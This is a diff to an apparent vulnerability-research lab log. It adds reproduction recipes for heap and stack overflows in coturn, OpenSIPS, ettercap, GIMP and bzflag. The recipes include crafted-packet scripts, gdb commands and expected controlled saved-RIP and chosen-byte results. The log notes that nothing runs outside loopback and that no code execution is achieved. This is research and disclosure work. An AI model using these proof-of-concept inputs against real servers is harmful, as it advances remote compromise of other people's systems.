@@ -44,6 +44,7 @@ containers whose host ports bind only to loopback.
 
 | Lane | Report | Provision | Build | Replay |
 |---|---|---|---|---|
+| CoturnOAuthNonce2Shell W330 (STAGED 09:3xZ, not admitted) | [status](../reports/coturnoauthnonce2shell-status.md), [brief](../reports/frontier-coturnoauthnonce2shell.md), [provenance](../lab/frontier/coturnoauthnonce2shell/PROVENANCE.md) | CVE-2026-43994 / GHSA-74pg-rfh2-5qw5, coturn `<=4.9.0`, fix `46368b3e` (tag 4.10.0); pinned `6e8dd731` archive `d5152f86…`, fixed `44df0803…`, patch `f266a92e…`, 10 harness/input SHA-256 pins in `HARNESS_SHA256.txt` | `cd lab/frontier/coturnoauthnonce2shell && bash bootstrap.sh && bash run-all.sh` (four ASan/plain builds of the direct sink harness, no listener) | rc 0, 13 PASS / 0 FAIL; ASan `WRITE of size 990` at `decode_oauth_token_gcm client/ns_turn_msg.c:2363` via `decode_oauth_token:2485`; unprotected plain build places chosen `0x41` bytes in `key_length=0x4141`, `timestamp=0x4141414141414141`, `lifetime=0x41414141`; fixed refuses `990 > 256`, nonce-256/16 clean on both (unrelated OpenSSL error-path leak in both, leak detection disabled); R1/R2/R3 ✓, R4 LIMITED, R5 NOT CLAIMED; no live wire or witness; full recipe in §09:2x–09:4xZ |
 | Opensips2Shell live XMPP receiver (new wire evidence) | [live report](../reports/opensips2shell-live-wire.md), [status](../reports/opensips2shell-status.md) | GHSA-5gm5-wj62-p234, `ENC_SIP_URI()` `sprintf` at stock 4.0.1; tarballs `248259e6…` / fixed 4.0.2 `5e268186…`, no published sidecar | `cd lab/opensips2shell-live && bash run-live.sh 401-asan 401-asan 299` (plus `401-plain … 299`, `401-plain-long … 900`, `402-asan … 299/900`); stock `opensips -F` on `127.0.0.1:5060`/`:5269` with `backend=server` | Stock 4.0.1 ASan: `stack-buffer-overflow WRITE of size 304` at `xmpp.c:285` via expat; no-canary 900-byte JID SIGSEGV after `fm_malloc` asks for `1111579232` bytes, instrumented frame `fromstr.len=1111579225` / `fromstr.s=0x5857565554535251`; 299-byte and stock 4.0.2 controls clean. Rung 3 live, rung 4 at the labeled chosen-field scope, W328 ESTABLISHED AS LABELED with a stock-build chosen-length counterexample, R5 UNKNOWN, raw-NUL gate negative. Full recipe in §08:1x–08:3xZ and §08:4x–09:0xZ |
 | Bzfs2Shell live stock loopback (new wire evidence) | [status](../reports/bzfs2shell-status.md), [brief](../reports/frontier-bzfs2shell.md) | tags `v2.4.30` / `v2.4.32` tarballs `29b3b97f…` / `86a5ded5…`, fix `8e501d68…`; trace-only edits to `NetHandler.cxx` (`19aeebbe…` / `3abb2fa5…`, originals under `lab/bzfs2shell-live/original/`) | `cd lab/bzfs2shell-live && bash run_live.sh <bin> <port> <tag>` (127.0.0.1 only; handshake from `send_packet.py`) | Real stock layout `sizeof(NetHandler)=2384`, `tcpmsg@96`, `tcplen@1120`: with tail `00 f8 ff ff` the second packet calls `recv(fd, tcpmsg-1024, 1028)`; ASan `heap-use-after-free WRITE of size 1024` via `recv` → `receive` → `tcpReceive`, plain build chosen words at `ares`/`info`/`fd`/`playerIndex`/`dotNotation`, fixed 2.4.32 rejects with no body `recv`; chosen-value control only, no r5, witness owed. Full recipe in §08:4x–09:0xZ |
 | NsdSvcb2Shell W323 (ADMITTED 07:2xZ, 203rd; W324 witness) | [status](../reports/nsdsvcb2shell-status.md), [brief](../reports/frontier-nsdsvcb2shell.md), [provenance](../lab/frontier/nsdsvcb2shell/PROVENANCE.md) | CVE-2026-12244 / CWE-122+190, NSD 4.14.0–4.14.2 configured-primary AXFR, fixed 4.14.3; tarballs `2bff5734…dd22d6` / `9629ad64…52bb12b`, patch `6d145e23…aa436d1` | `bash bootstrap.sh && bash run-all.sh` in `lab/frontier/nsdsvcb2shell` (direct sink, no socket) | rc 0, 38 PASS / 0 FAIL; ASan `WRITE of size 65509` at `rdata.c:3317`, sampled chosen bytes at `rdata+10..65508` in the plain build; patched and safe inputs clean; clean `git archive 70af6a92` replay (archive `690c887b…`, log `ade0447…`) repeated 38/0; operator admission replay of the pathspec archive `528b6e0a…` also 38/0 with byte-identical log; ADMITTED under standing #6 as the 203rd mind, R4 LIMITED to the sink harness, R5 NOT CLAIMED; witness #6179 (W324) ESTABLISHED AS LABELED from a clean archive with byte-identical 38/0 output, no counterexample or grade change; full recipe at the tail |
@@ -18259,3 +18260,146 @@ Grade: new adjacent in-process lane, stale RHS pointer at the append memcpy
 CONFIRMED (rung 3 memory-safety differential), rung 4 NOT CLAIMED, wire path
 CLOSED by the `Warning.warn` survey, full rung 5 NOT ACHIEVED. Detail in
 `reports/ruby2shell-investigation.md` §W329.
+
+## 2026-11-27 09:2x–09:4xZ — staged coturn, stock-frame RIP, tbuf2, W329 and W330
+
+### CoturnOAuthNonce2Shell — staged direct sink (R4 LIMITED, no live wire)
+
+From the repository root:
+
+```
+cd lab/frontier/coturnoauthnonce2shell
+sha256sum -c HARNESS_SHA256.txt          # 10 entries, also checked by the runner
+bash bootstrap.sh && bash run-all.sh
+```
+
+Only pinned archives (`pins/vuln.tar.gz` `d5152f86…` at `6e8dd731`,
+`pins/fixed.tar.gz` `44df0803…` at fix `46368b3e`) and the committed harness
+are used; no listener is started. Expect `TOTAL: 13 PASS / 0 FAIL`. The
+vulnerable ASan binary must report `stack-buffer-overflow`, `WRITE of size
+990`, `decode_oauth_token_gcm client/ns_turn_msg.c:2363` via
+`decode_oauth_token:2485`, with first invalid byte at harness-frame offset
+456. The unprotected plain binary must print `key_length=0x4141`,
+`mac_key0=0x41`, `timestamp=0x4141414141414141`, `lifetime=0x41414141` and
+exit 0; the fixed binary must instead print `nonce length too large: 990 >
+256` with all-zero fields and no ASan report. `nonce-256-safe.bin` and
+`nonce-16-safe.bin` give `DECODE_OK=0` and no overflow on both sides. Both
+sides also hit an unrelated OpenSSL error-path leak, so the runner sets
+`ASAN_OPTIONS=detect_leaks=0`; that leak is a preserved negative, not a pass.
+`runs/`, `src-vuln/`, `src-fixed/`, binaries and `build-*.log` are gitignored
+and regenerate with those two commands. The 990-byte copy is a direct sink
+harness mirror of upstream `FuzzOAuthToken.c`, not a wire result: no live
+coturn process, STUN/TURN request, saved-RIP value or witness replay exists.
+The target is STAGED (window 214, no charter, unit or route change); the
+advisory's pre-auth `--oauth` path is the next experiment, not a claim here.
+
+### Opensips2Shell — stock saved RIP via the early return (rung 4 only)
+
+Reuse the loopback stock 4.0.1 no-canary tree from `lab/opensips2shell-live`
+(`401-plain/opensips`, `401-plain/modules/xmpp/xmpp.so` SHA-256 `09d4c0b6…`,
+unchanged from the §08:1x–08:3xZ recipe). Substitute `MPATH` in
+`opensips-xmpp.cfg.template` for that tree's `modules` directory, then start
+the receiver under the committed gdb script with `follow-fork-mode child`
+(the first fork is the XMPP receiver) and, from a second terminal on the same
+host, send the stanza:
+
+```
+cd lab/opensips2shell-live
+gdb -batch -x gdb-early.cmd --args "$PWD/401-plain/opensips" -F \
+  -f evidence/opensips-early.cfg -w "$PWD/401-plain"
+# second terminal, same directory:
+python3 send_early.py 900 260 RIPCNTRL
+python3 send_early.py 900 260 ABCDEFGH     # repeat with the marker changed
+```
+
+`send_early.py` (SHA-256 `850a5fa1…`) sends one stream header and one
+`<message/>` to `127.0.0.1:5269`; the 260-byte `to` takes
+`uri_xmpp2sip`'s early `return -1` before `tm`, so the stock function returns
+through the overwritten slot. Expected at the SIGSEGV stop: `[rbp]` is
+`0x5a59585756555453` (`STUVWXYZ`), `[rbp+8]` and frame `#1` are
+`0x4c52544e43504952` for `RIPCNTRL` and `0x4847464544434241` for
+`ABCDEFGH`; `rip` stays at `xmpp_send_sip_msg+631`, the function's `ret`,
+because that target is noncanonical (#GP). The daemon logs must show both
+`uri_xmpp2sip: Buffer overflow` and `xmpp_send_sip_msg: Failed to translate
+xmpp uri to sip uri` (the early return was taken).
+
+For the closed partial-overwrite route use the same config with
+`gdb-partial.cmd` and `python3 send_early.py 886 260 j/`: only the low two
+bytes of the saved RIP stay chosen, the `sprintf` NUL zeroes byte 2, and the
+CPU stops at canonical but unmapped `0x7ffff7002f6a` (module base
+`0x7ffff7eda000`) rather than at the `ret`. The `xmpp:destroy` line in that
+capture is parent shutdown, not executed chosen code. Raw gdb/wire logs are
+gitignored under `artifacts-early/` (hashes in
+`reports/opensips2shell-live-wire.md`); no listener survives either probe,
+and neither route executes attacker code. W328's ESTABLISHED verdict covers
+only the earlier chosen-field/allocation scope; rung 5 stays UNKNOWN.
+
+### Ettercap2Shell — Experiment D, the folded `tbuf2` sink
+
+```
+python3 lab/frontier/ettercap2shell/live-evidence/mkdescpcap.py
+cd lab/frontier/ettercap2shell/live/ettercap-0.8.4.1/build-asan
+ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
+  ./src/ettercap -T -q -r ../../../live-evidence/gg-desc-long.pcap -i lo
+cd ../../../../../..
+cd lab/frontier/ettercap2shell/live/ettercap-0.8.5.1/build-plain
+./src/ettercap -T -q -r ../../../live-evidence/gg-desc-long.pcap -i lo
+```
+
+The three generated pcaps have safe version `0x2a` and description bytes
+`(0x41 + i) mod 256`, isolating this sink from `gg_get_version`. Expected:
+vulnerable `gg-desc-long` (GG payload 132, copy 110) reports ASan `WRITE of
+size 110` at `ec_gg.c:363`, `0 bytes after 71-byte region` allocated at
+`:355`; `gg-desc-edge` writes one NUL at `:364`; `gg-desc-safe` is clean.
+The vulnerable plain build logs `VERSION:` bytes `91 92 … ae` (pattern
+indices 80–109) read from the adjacent `tbuf3`, then exits 134 with
+`free(): invalid size`; `live-evidence/gdb-desc-adj.out` measures
+`tbuf3 - tbuf2 = 80`. Fixed 0.8.5.1 caps `copy_len` at `GG_MAX_LEN=70` at
+every login/status site: its plain build prints `VERSION: 7.7` and exits 0,
+and its ASan build is clean. Raw logs are `live-evidence/{asan,plain,
+gdb}-desc-*.out`; the earlier `gg_get_version` recipe and grade still stand.
+This sink gives chosen-byte readback in a named live field, not pointer
+control, a marker or a command; AV:A and rung 5 are unchanged.
+
+### Gimpjif2Shell W329 — benign inflated prefix closes the short-window guess
+
+From `lab/frontier/gimpjif2shell/live`, with the SHA-256-verified GIMP 3.2.8
+AppImage tree in `GIMPJIF_APPIMAGE_WORK` (the same gitignored tree used by the
+earlier live recipes), the no-shim runner
+`run-appimage-benign-329.sh` (`4d864bb2…`) with
+`gdb-benign-329.cmd` (`d79f91fe…`) executes one published-hex JIF at a time:
+
+```
+GIMPJIF_JIF_NAME=w329-benign-280.jif GIMPJIF_LOG_PREFIX=w329-benign-280 W329_CHANGE=0 \
+  bash run-appimage-benign-329.sh
+GIMPJIF_JIF_NAME=w329-benign-4140.jif GIMPJIF_LOG_PREFIX=w329-benign-4140 W329_CHANGE=1 \
+  bash run-appimage-benign-329.sh
+```
+
+The JIFs (`5862901f…` and `d2af0b24…`) zero-fill all 260 `indexes` bytes and
+keep `+264=0x21` / `+272=1`; only the second changes `GData.qdatas`'s low two
+bytes to `0x4140`. Both probes must print `orig=target=0x…3800`,
+`size264=0x21`, `nq272=0x1`, `OVERWRITE CONFIRMED` (changed arm:
+`POST qdatas=0x…4140 = target`), two armed access watchpoints and zero hits.
+Both arms fault before `gimp_drawable_get_buffer`, so no image width prints;
+the preserved first control used an invalid `gdb.Breakpoint(...,
+pending=True)` call and logged no probe lines (`e3b0c442…`): a tooling
+negative, not heap evidence. Grade unchanged: rung 3 pinned verbatim / rung 4
+PARTIAL chosen bytes, NO r5; see `reports/frontier-gimpjif2shell.md` §W329.
+
+### Bzfs2Shell W330 — author durability replay, not an independent verdict
+
+The §08:4x–09:0xZ live recipe is unchanged: `bash run_live.sh <bin> <port>
+<tag>` from `lab/bzfs2shell-live`, 127.0.0.1 only. Re-running it on ports
+15157/15158/15159 reproduced `tcpmsg@96` / `tcplen@1120` in the 2384-byte
+object, `tcplen=-1024`, `recv(fd, tcpmsg-1024, 1028)`, chosen
+`ares=0x41424344454647bc` / `info=0x41424344454647bd` readback and a plain
+segfault; ASan reported `heap-use-after-free WRITE of size 1028` through
+`recv` → `NetHandler::receive` → `NetHandler::tcpReceive` with a 1028-byte
+second packet (the 1024-byte packet used in the first replay gives
+`WRITE of size 1024`); fixed v2.4.32 logged `fixed-reject len=1024` and the
+client's second `sendall` failed on a closed pipe. Logs
+`live-w330-{plain,asan,fixed}.log` are gitignored. Witness #761's 20/0
+verdict covers only the earlier harness stand-in; the live scope's replay
+(#6258) is still UNKNOWN and no chosen target, function pointer or execution
+was observed.
